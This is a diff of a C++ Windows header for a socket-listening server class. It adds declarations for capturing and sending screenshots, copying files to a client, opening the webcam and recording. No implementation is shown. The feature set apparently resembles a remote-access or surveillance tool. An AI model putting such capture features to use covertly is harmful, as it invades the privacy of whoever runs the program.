@@ -13,6 +13,7 @@
 #include <cstdint>
 #include <sstream>
 #include <opencv2/opencv.hpp>
+#include <ws2tcpip.h>
 
 // Ensure NO_ERROR is defined
 #ifndef NO_ERROR
@@ -39,12 +40,14 @@ private:
     SOCKET listenSocket;
     ULONG_PTR gdiplusToken; // Add this member
     void handleClient(SOCKET clientSocket);
-    // void takeScreenshot(const std::string& filename);
-    // void sendScreenshot(SOCKET clientSocket, const std::string& filename);
-    void sendScreenshot(SOCKET clientSocket, const std::string &filePath);
-    std::vector<unsigned char> captureScreenshot();
+    bool captureScreenshot(cv::Mat& outImage);
+    bool captureAndSendScreenshot(SOCKET clientSocket);
     void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
     void openWebcam(SOCKET clientSocket);
+    bool recording;
+    void startRecording(cv::VideoCapture& webcam, SOCKET clientSocket);
+    void stopRecording(SOCKET clientSocket);
+    // void saveScreenshot(const std::string& filename);
 };
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
